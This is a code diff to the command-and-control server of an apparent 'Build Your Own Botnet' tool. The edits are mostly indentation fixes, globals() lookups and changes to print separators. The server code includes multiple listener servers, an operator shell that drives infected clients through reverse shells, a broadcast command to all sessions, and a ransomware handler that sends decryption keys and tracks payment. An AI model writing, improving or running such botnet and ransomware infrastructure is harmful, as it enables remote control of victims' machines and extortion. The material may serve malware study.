@@ -66,7 +66,7 @@ __threads = {}
 __abort   = False
 __debug   = bool('--debug' in sys.argv)
 __logger  = logging.getLogger('SERVER')
-logging.basicConfig(level=logging.DEBUG if __debug else logging.INFO, handler=logging.StreamHandler())
+logging.basicConfig(level=logging.DEBUG if globals()['__debug'] else logging.INFO, handler=logging.StreamHandler())
 
 def main():
     parser = argparse.ArgumentParser(
@@ -99,18 +99,18 @@ def main():
 
     # resource server
     globals()['resource_server'] = Server(host=options.host, port=options.port + 1, handler=handlers.RequestHandler)
-    __threads['resources'] = resource_server.serve_until_stopped()
-    __logger.info("Resource server started on {}:{}...".format(options.host, options.port + 1))
+    globals()['__threads']['resources'] = resource_server.serve_until_stopped()
+    globals()['__logger'].info("Resource server started on {}:{}...".format(options.host, options.port + 1))
 
     # task server
     globals()['task_server'] = Server(host=options.host, port=options.port + 2, handler=handlers.TaskHandler)
-    __threads['tasks'] = task_server.serve_until_stopped()
-    __logger.info("Task server started on {}:{}...".format(options.host, options.port + 2))
+    globals()['__threads']['tasks'] = task_server.serve_until_stopped()
+    globals()['__logger'].info("Task server started on {}:{}...".format(options.host, options.port + 2))
 
     # client server
     globals()['client_server'] = C2(host=options.host, port=options.port, db=options.db)
-    __threads['c2'] = client_server.serve_until_stopped()
-    __logger.info("Client server started on {}:{}...".format(options.host, options.port))
+    globals()['__threads']['c2'] = client_server.serve_until_stopped()
+    globals()['__logger'].info("Client server started on {}:{}...".format(options.host, options.port))
 
     # server shell
     client_server.server_shell()
@@ -145,11 +145,14 @@ class Server(socketserver.ThreadingTCPServer):
         abort execution if True
         
         """
+        abort = False
         while True:
             rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
             if rd:
+                util.display("[+]", color='green', style='bright', end=',')
+                util.display("New connection", color='reset', style='bright')
                 self.handle_request()
-            abort = self.abort
+            abort = globals().get('__abort')
             if abort:
                 break
 
@@ -179,15 +182,15 @@ class C2(Server):
 
         Returns a byob.server.C2 instance
         
-	"""
-        super(C2, self).__init__(host=host, port=port, handler=handlers.SessionHandler)
+    """
+        Server.__init__(self, host=host, port=port, handler=handlers.SessionHandler)
         self._active            = threading.Event()
         self._count             = 1
         self._prompt            = None
         self.current_session    = None
         self.sessions           = {}
         self.banner             = self._banner()
-	self.database 		= database.Database(db)
+        self.database       = database.Database(db)
         self.commands           = {
             'help'          :   self.help,
             'exit'          :   self.quit,
@@ -216,7 +219,7 @@ class C2(Server):
     def _error(self, data):
         lock = self.current_session.lock if self.current_session else self._lock
         with lock:
-            util.display('[-] ', color='red', style='dim', end='')
+            util.display('[-] ', color='red', style='dim', end=',')
             util.display('Server Error: {}\n'.format(data), color='reset', style='dim')
 
     def _print(self, info):
@@ -236,11 +239,11 @@ class C2(Server):
                         if len(str(info.get(key))) > 80:
                             info[key] = str(info.get(key))[:77] + '...'
                         info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
-                        util.display('\x20' * 4, end='')
+                        util.display('\x20' * 4, end=',')
                         util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         else:
             with lock:
-                util.display('\x20' * 4, end='')
+                util.display('\x20' * 4, end=',')
                 util.display(str(info), color=self._text_color, style=self._text_style)
 
 
@@ -250,14 +253,14 @@ class C2(Server):
             if data:
                 util.display('\n{}\n'.format(data))
             else:
-                util.display(prompt, end='')
+                util.display(prompt, end=',')
 
     def _banner(self):
         try:
             banner = __doc__ if __doc__ else "Command & Control (Build Your Own Botnet)"
             with self._lock:
                 util.display(banner, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
-                util.display("[?] ", color='yellow', style='bright', end='')
+                util.display("[?] ", color='yellow', style='bright', end=',')
                 util.display("Hint: show usage information with the 'help' command\n", color='reset', style='dim')
             return banner
         except Exception as e:
@@ -290,7 +293,7 @@ class C2(Server):
 
     def _get_prompt(self, data):
         with self._lock:
-	    util.display('', color=self._prompt_color, style=self._prompt_style, end='')
+            util.display('', color=self._prompt_color, style=self._prompt_style, end=',')
             return raw_input(data.rstrip())
 
     def eval(self, code):
@@ -301,7 +304,7 @@ class C2(Server):
         :param str code:    Python code to execute
         
         """
-        if __debug:
+        if globals()['__debug']:
             try:
                 return eval(code)
             except Exception as e:
@@ -318,7 +321,7 @@ class C2(Server):
             for session in self._get_sessions():
                 session._active.set()
                 self.send('mode passive', session=session.id)
-        __abort = True
+        globals()['__abort'] = True
         self._active.clear()
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
         self.display('Exiting...')
@@ -337,7 +340,7 @@ class C2(Server):
         info    = info if info else {"back": "background the current session", "shell <id>": "interact with client via reverse shell", "sessions": "list all sessions", "exit": "exit the program but keep sessions alive", "sendall <command>": "send a command to all active sessions", "settings <value> [options]": "list/change current display settings"}
         max_key = max(map(len, info.keys() + [column1])) + 2
         max_val = max(map(len, info.values() + [column2])) + 2
-        util.display('\n', end='')
+        util.display('\n', end=',')
         util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
         for key in sorted(info):
             util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
@@ -402,11 +405,11 @@ class C2(Server):
                 prompt_style = [style for style in ['DIM','BRIGHT','NORMAL'] if style == self._prompt_style.upper()][0]
             except Exception as e:
                 return '{} error: {}'.format(self.settings.func_name, str(e))
-            util.display('\n', end='')
+            util.display('\n', end=',')
             util.display('Settings'.center(40), color='reset', style='bright')
             util.display('text color/style: {}'.format(' '.join((text_color, text_style)).center(40)), color='reset', style='dim')
             util.display('prompt color/style: {}'.format(' '.join((prompt_color, prompt_style)).center(40)), color='reset', style='dim')
-            util.display('debug: {}'.format('true' if __debug else 'false'), color='reset', style='dim')
+            util.display('debug: {}'.format('true' if globals()['__debug'] else 'false'), color='reset', style='dim')
             util.display('', color=self._text_color, style=self._text_style)
         else:
             target, _, options = args.partition(' ')
@@ -419,14 +422,14 @@ class C2(Server):
                         util.display("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                         return
                     self._prompt_color = option
-                    util.display("prompt color changed to ", color='reset', style='bright', end='')
+                    util.display("prompt color changed to ", color='reset', style='bright', end=',')
                     util.display(option, color=self._prompt_color, style=self._prompt_style)
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
                         util.display("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
-		        return
+                        return
                     self._prompt_style = option
-                    util.display("prompt style changed to ", color='reset', style='bright', end='')
+                    util.display("prompt style changed to ", color='reset', style='bright', end=',')
                     util.display(option, color=self._prompt_color, style=self._prompt_style)
                 else:
                     util.display("usage: settings prompt <option> [value]", color='reset', style='bright')
@@ -434,32 +437,32 @@ class C2(Server):
                 if setting == 'color':
                     if not hasattr(colorama.Fore, option):
                         util.display("usage: settings text color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
-			return
+                        return
                     self._text_color = option
-                    util.display("text color changed to ", color='reset', style='bright', end='')
+                    util.display("text color changed to ", color='reset', style='bright', end=',')
                     util.display(option, color=self._text_color, style=self._text_style)
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
                         util.display("usage: settings text style [value]\nstyles:   bright/normal/dim")
-		        return
+                        return
                     self._text_style = option
-                    util.display("text style changed to ", color='reset', style='bright', end='')
+                    util.display("text style changed to ", color='reset', style='bright', end=',')
                     util.display(option, color=self._text_color, style=self._text_style)
             elif target == 'debug':
                 if not setting:
-                    if __debug:
-                        util.display("[!] ", color='yellow', style='bright', end='')
+                    if globals()['__debug']:
+                        util.display("[!] ", color='yellow', style='bright', end=',')
                         util.display("Debug: On", color='reset', style='bright')
                     else:
-                        util.display("[-] ", color='yellow', style='dim', end='')
+                        util.display("[-] ", color='yellow', style='dim', end=',')
                         util.display("Debug: Off", color='reset', style='dim')
                 elif str(setting).lower() in ('0','off','false','disable'):
-                    __debug = False
-                    util.display("[-] ", color='yellow', style='dim', end='')
+                    globals()['__debug'] = False
+                    util.display("[-] ", color='yellow', style='dim', end=',')
                     util.display("Debugging disabled", color='reset', style='dim')
                 elif str(setting).lower() in ('1','on','true','enable'):
-                    __debug = True
-                    util.display("[!] ", color='yellow', style='bright', end='')
+                    globals()['__debug'] = True
+                    util.display("[!] ", color='yellow', style='bright', end=',')
                     util.display("Debugging enabled", color='reset', style='bright')            
                 else:
                     self._error("invalid mode for 'debugging'")
@@ -601,7 +604,7 @@ class C2(Server):
         `Optional`
         :param str verbose:   verbose output (default: False)
 
-	"""
+    """
         lock = self._lock if not self.current_session else self.current_session._lock
         with lock:
             sessions = self.database.get_sessions(verbose=verbose, display=True)
@@ -614,7 +617,7 @@ class C2(Server):
         `Required`
         :param str args:    encrypt, decrypt, payment
 
-	"""
+    """
         if self.current_session:
             if 'decrypt' in str(args):
                 self.send("ransom decrypt %s" % key.exportKey(), session=self.current_session.session)
@@ -641,7 +644,7 @@ class C2(Server):
             if self.current_session:
                 self.current_session._active.clear()
             self.current_session = self.sessions[int(session)]
-            util.display("\n\t[+] ", color='cyan', style='bright', end='')
+            util.display("\n\t[+] ", color='cyan', style='bright', end=',')
             util.display("Client {} selected\n".format(session.id), color='reset', style='dim')
             self.current_session._active.set()
             return self.current_session.run()
@@ -670,7 +673,7 @@ class C2(Server):
 
         """
         self._active.set()
-	while True:
+        while True:
             try:
                 self._active.wait()
                 self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
@@ -684,21 +687,21 @@ class C2(Server):
                         except Exception as e1:
                             output  = str(e1)
                     elif cmd == 'cd':
-			try:
-			    os.chdir(action)
-		        except: pass
+                        try:
+                            os.chdir(action)
+                        except: pass
                     else:
                         try:
                             output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                         except: pass
                     if output:
                         self.display(str(output))
-                if __abort:
+                if globals()['__abort']:
                     break
             except KeyboardInterrupt:
                 self._active.clear()
                 break
-	self.quit()
+        self.quit()
 
 
 
